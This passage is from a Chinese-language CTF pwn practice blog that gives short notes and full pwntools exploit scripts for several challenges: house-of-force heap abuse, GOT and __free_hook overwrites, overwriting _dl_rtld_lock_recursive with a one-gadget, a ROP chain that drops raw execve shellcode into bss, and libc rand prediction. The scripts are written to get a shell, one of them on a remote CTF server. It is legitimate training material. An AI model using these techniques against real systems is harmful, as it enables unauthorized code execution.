class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x8048816</span></span><br><span class="line">sla(<span class="string">&#x27;want to sort?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># [0x804a014] gets@GLIBC_2.0 -&gt; 0xf7d9c3f0 (gets) ◂— push ebp</span></span><br><span class="line"><span class="comment"># [0x804a018] free@GLIBC_2.0 -&gt; 0x8048816 ◂— push   ebp</span></span><br><span class="line"><span class="comment"># ptr+4--&gt;free@plt</span></span><br><span class="line">sla(<span class="string">&#x27;number:&#x27;</span>,<span class="built_in">str</span>(vuln).ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)+p32(elf.got[<span class="string">&#x27;gets&#x27;</span>]))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;result:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27; \n&#x27;</span>, drop=<span class="literal">True</span>)) + \</span><br><span class="line">    <span class="number">0x100000000</span> - libc.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;want to sort?&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;number:&#x27;</span>, <span class="built_in">str</span>(system-<span class="number">0x100000000</span>).ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>) +</span><br><span class="line">    p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">sla(<span class="string">&#x27;number:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>actf_2019_actfnote</strong></p>
<p>house of force</p>
<p>没注意到size可以是负数</p>
<p>edit可以覆盖到top chunk size</p>
<p>如何leak libc</p>
<p>strdup返回的字符串在使用完之后要及时用free释放掉</p>
<p>我们把截断符覆盖，栈内容就被复制到chunk中，之后show泄漏libc</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618477908665-fcf16d88-1ea8-44ec-a82e-5c3fd77e3b4e.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618479134070-27cc4ebb-79e2-468f-8ee1-f6585f092557.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base = u64(sh.recvuntil(</span><br><span class="line">        <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x07b61e</span></span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;/$ &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;note name: &#x27;</span>,name)</span><br><span class="line">    sa(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27; note id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a\n&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a\n&#x27;</span>,<span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a\n&#x27;</span>,<span class="string">&#x27;b\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment"># top chunk上移形成overlap chunk</span></span><br><span class="line">add(-<span class="number">0x80</span>, p64(__free_hook), <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 修改free_hook</span></span><br><span class="line">edit(<span class="number">2</span>, p64(system))</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>



<p><strong>hf2020 marksman</strong></p>
<p>可以任意地址写3字节，</p>
<p>程序最后会调用exit</p>
<blockquote>
<p>在exit()中执行流程为</p>
<p>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</p>
<p>由于__rtld_lock_unlock_recursive存放在结构体空间，为可读可写，那么如果可以修改__rtld_lock_unlock_recursive,就可以在调用exit()时劫持程序流。</p>
<p>_rtld_lock_lock_recursive也是一样的流程。</p>
<p>————————————————</p>
<p>版权声明：本文为CSDN博主「starssgo」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43116977/article/details/105485947">https://blog.csdn.net/qq_43116977/article/details/105485947</a></p>
</blockquote>
<p>总之中间调来调去最后会调用 _rtld_global结构 体成员 _dl_rtld_lock_recursive 指针</p>
<p>改写它内容后3位为og即可</p>
<p>（_dl_rtld_lock_recursive指向的内容距离 libc_base有点远，修改后三字节要多试几次才能成功emmm ）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618488882443-55d39820-d87c-456a-a930-0bf1ca9724f7.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489162188-e1230e99-83b1-4631-a682-3fae3f4870ad.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489550470-d97a4b64-5915-4b98-9393-1b815a69da01.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(</span><br><span class="line">    <span class="string">&quot;/home/ive6ix/Desktop/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29718</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;: 0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive = libc_base+<span class="number">0x81df60</span></span><br><span class="line">sla(<span class="string">&#x27;shoot!shoot!&#x27;</span>, <span class="built_in">str</span>(_dl_rtld_lock_recursive))</span><br><span class="line"></span><br><span class="line">og = libc_base+<span class="number">0x10a38c</span>-<span class="number">5</span></span><br><span class="line">sla(<span class="string">&#x27;biang!&#x27;</span>,<span class="built_in">chr</span>(og&amp;<span class="number">0xff</span>))</span><br><span class="line">sla(<span class="string">&#x27;biang!&#x27;</span>,<span class="built_in">chr</span>((og&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;biang!&#x27;</span>,<span class="built_in">chr</span>((og&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<p>这种修改 _dl_fini函数指针，是glibc2.27加了 对vtable的检查之后，一个新的绕过方法</p>
<p>之前在gibc2.23的时候是 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f54f48ce2695">修改stdout函数表</a></p>
<h3 id="4-16"><a href="#4-16" class="headerlink" title="4.16"></a>4.16</h3><h3 id="4-17"><a href="#4-17" class="headerlink" title="4.17"></a>4.17</h3><p>接上面，再练一道类似的题</p>
<p>给了libc和栈地址，任意地址写</p>
<p>可以改写栈上的返回地址为og，但是ret前exit了</p>
<p>所以还是得从exit下手，2.27的版本改__rtld_lock_unlock_recursive+0x8为og</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">&#x27;./write&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(</span><br><span class="line">    <span class="string">&quot;/home/ive6ix/Desktop/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;puts: 0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;stack: 0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;stack_addr&#x27;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive = <span class="number">0x619f68</span> + libc_base</span><br><span class="line">og = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">sla(<span class="string">&#x27;uit&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;ptr: &#x27;</span>,<span class="built_in">str</span>(_dl_rtld_lock_recursive))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;val: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0x4f322</span>+libc_base))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;uit&#x27;</span>, <span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>





<h3 id="4-21"><a href="#4-21" class="headerlink" title="4.21"></a>4.21</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39864373/article/details/111512547">pwn题的搭建</a></p>
<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/09/hitctfpwn/">复现hitCTF2020</a></p>
<p>向bss写入shellcode再跳转就好了</p>
<p>还有一种方法 反弹shell 还没看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./dagongren1&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9997</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line"><span class="built_in">format</span> = <span class="number">0x000000000040088B</span> <span class="comment"># %s</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400811</span></span><br><span class="line"><span class="comment"># scanf(&quot;%s&quot;,&amp;buf)</span></span><br><span class="line">pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">pay += p64(pop_rdi)</span><br><span class="line">pay += p64(<span class="built_in">format</span>)</span><br><span class="line">pay += p64(pop_rsi_r15)</span><br><span class="line">pay += p64(elf.bss()+<span class="number">0x250</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(elf.plt[<span class="string">&#x27;__isoc99_scanf&#x27;</span>])</span><br><span class="line">pay += p64(elf.bss()+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;Come On&#x27;</span>,pay)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sc = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment"># sc=asm(shellcraft.sh())</span></span><br><span class="line">sl(sc)</span><br><span class="line">sl(<span class="string">&#x27;exec /bin/sh 1&gt;&amp;0&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618993139811-95019e88-fa9a-479f-92a6-363d6e16c1dd.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">&#x27;./lucky&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;lucky guy&#x27;</span>,<span class="string">&#x27;wendy&#x27;</span>)</span><br><span class="line">libc.srand((libc.time(<span class="number">0</span>) / <span class="number">0xA</span>)+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(&#x27;number:&#x27;, str(libc.rand()))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    sla(<span class="string">&#x27;number:&#x27;</span>,<span class="built_in">str</span>(libc.rand()))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>







</article><ul class="pager blog-pager"><li class="previous"><a href="/2021/06/05/hws2020/" data-toggle="tooltip" data-placement="top" title="hws2020">← Publicação Anterior</a></li></ul><div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div><script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"> </script><script>var cloudTieConfig = {
  url: document.location.href, 
  sourceId: "",
  productKey: "64d7f0abf9224be3bfdcc6cfb9b83fcf",
  target: "cloud-tie-wrapper"
